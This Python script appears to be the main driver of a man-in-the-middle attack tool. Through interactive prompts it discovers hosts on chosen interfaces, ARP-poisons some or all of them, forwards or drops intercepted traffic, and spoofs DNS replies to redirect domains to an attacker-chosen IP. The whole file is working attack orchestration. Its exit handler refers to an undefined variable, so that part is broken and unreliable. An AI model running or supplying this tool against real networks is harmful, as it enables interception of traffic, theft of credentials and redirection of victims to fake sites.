# Standard libraries
from collections import defaultdict
from threading import Thread, Lock
from time import sleep

# Additional libraries
from scapy.arch import get_if_list

# Local libraries
from src import arp, discover, dns, forward
from src.tools import powerset, let_user_pick_options, let_user_input_number, let_user_input_domain, let_user_input_ip

arp_poison_frequency = 3
initial_discovery_time = 60
show_discovery = True
show_arp_poison = True
show_dns_spoof = True
show_selective_forward = True
show_debug = False

# (Default) settings
settings = dict()
settings['arp poison frequency'] = 3  # Poisoning frequency in seconds
settings['initial discovery time'] = 60  # Time to discover before starting poisoning in seconds
settings['show discovery'] = True  # Whether to display a message when a new host has been discovered
settings['show arp poison'] = True  # Whether to display a message when an ARP poison packet is sent
settings['show dns spoof'] = True  # Whether to display a message when a DNS answer has been spoofed
settings[
    'show selective forward block'] = True  # Whether to display a message when a packet selected not to be forwarded
settings['show debug'] = False  # Whether to display debug messages

# Variables for the program
settings['currently discovering'] = True
settings['continue discovery during poisoning'] = True
settings['forward'] = 'all-except'
settings['chosen interfaces'] = set()
settings['poisoned hosts'] = defaultdict(dict)
settings['whitelist poisoned hosts'] = defaultdict(dict)
settings['spoof all domains'] = True
settings['spoofed domains'] = set()
settings['whitelist spoofed domains'] = set()
settings['redirect spoofed domains to'] = ''
settings['restore arp cache'] = True
settings['interrupted'] = False
settings['locks'] = defaultdict(Lock)
settings['passive discover threads'] = set()
settings['forward threads'] = set()
settings['arp poison threads'] = set()
settings['dns spoof threads'] = set()


def setup():
    print('On which interfaces would you like to discover and attack?')
    interfaces = get_if_list()
    powerset_interfaces = powerset(interfaces)
    chosen = let_user_pick_options(powerset_interfaces, True)
    settings['chosen interfaces'] = powerset_interfaces[chosen]
    if len(settings['chosen interfaces']) == 0:
        return

    print('How long would you like to discover hosts initially?')
    print('Recommended: ' + str(settings['initial discovery time']))
    settings['initial discovery time'] = let_user_input_number(True)

    # Start passive discovery
    print('Started passive network discovery ...')
    for interface in settings['chosen interfaces']:
        thread = Thread(target=discover.passive, args=(interface, settings))
        thread.daemon = True
        thread.start()
        settings['passive discover threads'].add(thread)

    sleep(settings['initial discovery time'])
    settings['currently discovering'] = False
    sleep(2)

    print('Would you like to ARP poison all hosts?')
    chosen = let_user_pick_options(['yes', 'no'], True)
    if chosen == 0:
        print('Would you like to continue host discovery while poisoning?')
        chosen2 = let_user_pick_options(['yes', 'no'], True)
        if chosen2 == 0:
            settings['continue discovery during poisoning'] = True
    elif chosen == 1:
        print('Would you like to whitelist hosts or select hosts to be attacked?')
        chosen2 = let_user_pick_options(['whitelist hosts', 'select hosts to be attacked'], True)
        if chosen2 == 0:
            for interface in settings['chosen interfaces']:
                print('Which hosts would you like to whitelist on ' + interface + '?')
                powerset_hosts_interface = powerset(settings['poisoned hosts'][interface])
                settings['whitelist poisoned hosts'][interface] = powerset_hosts_interface[
                    let_user_pick_options(powerset_hosts_interface, True)]
        elif chosen2 == 1:
            for interface in settings['chosen interfaces']:
                print('Which hosts would you like to attack on ' + interface + '?')
                powerset_hosts_interface = powerset(settings['poisoned hosts'][interface])
                settings['poisoned hosts'][interface] = powerset_hosts_interface[
                    let_user_pick_options(powerset_hosts_interface, True)]
        elif chosen2 is None:
            return
    elif chosen is None:
        return

    print('At what frequency would you like to ARP poison hosts?')
    print('Recommended: ' + str(settings['arp poison frequency']))
    settings['arp poison frequency'] = let_user_input_number(True)

    print('Which intercepted packages would you like to forward?')
    chosen = let_user_pick_options(['all', 'all, except non-spoofed DNS answers', 'none'], True)
    if chosen == 0:
        settings['forward'] = 'all'
    if chosen == 1:
        settings['forward'] = 'all-except'

    print('Would you like to restore ARP caches when the attack is broken off?')
    chosen = let_user_pick_options(['yes', 'no'], True)
    if chosen == 1:
        settings['restore arp cache'] = False

    print('Would you like to spoof all domains with DNS poisoning?')
    chosen = let_user_pick_options(['yes', 'no'], True)
    if chosen == 1:
        print('Would you like to whitelist domains or select domains to be spoofed?')
        chosen2 = let_user_pick_options(['whitelist domains', 'select domains to be spoofed'], True)
        if chosen2 == 0:
            print('Which domain names would you like to whitelist?')
            print('You can enter multiple domains ony by one.')
            domain = let_user_input_domain(True)
            while domain is not None:
                settings['whitelist spoofed domains'].add(domain)
                domain = let_user_input_domain(False)
        elif chosen2 == 1:
            settings['spoof all domains'] = False
            print('Which domain names would you like to spoof?')
            print('You can enter multiple domains ony by one or enter no domains at all.')
            domain = let_user_input_domain(False)
            while domain is not None:
                settings['spoofed domains'].add(domain)
                domain = let_user_input_domain(False)

    if settings['spoof all domains'] or len(settings['spoofed domains']) > 0:
        print('To which IP would you like to redirect spoofed domains?')
        settings['redirect spoofed domains to'] = let_user_input_ip(True)

    if settings['continue discovery during poisoning']:
        settings['currently discovering'] = True

    # Start continuous poisoning
    print('Started initial poisoning ...')
    for interface in settings['chosen interfaces']:
        thread = Thread(target=forward.forward, args=(interface, settings))
        thread.daemon = True
        thread.start()
        settings['forward threads'].add(thread)

        thread = Thread(target=arp.poison, args=(interface, settings))
        thread.daemon = True
        thread.start()
        settings['arp poison threads'].add(thread)

        if settings['spoof all domains'] or len(settings['spoofed domains']) > 0:
            thread = Thread(target=dns.spoof, args=(interface, settings))
            thread.daemon = True
            thread.start()
            settings['dns spoof threads'].add(thread)

        sleep(settings['arp poison frequency'] / len(settings['chosen interfaces']))

    # Wait for keyboard interrupt
    while True:
        sleep(1)


if __name__ == '__main__':
    try:
        setup()
    except KeyboardInterrupt:
        print('Exiting program ...')
        settings['interrupted'] = True
        sleep(arp_poison_frequency)
        if restore_arp_cache:
            for interface in settings['chosen interfaces']:
                arp.restore(interface, settings)
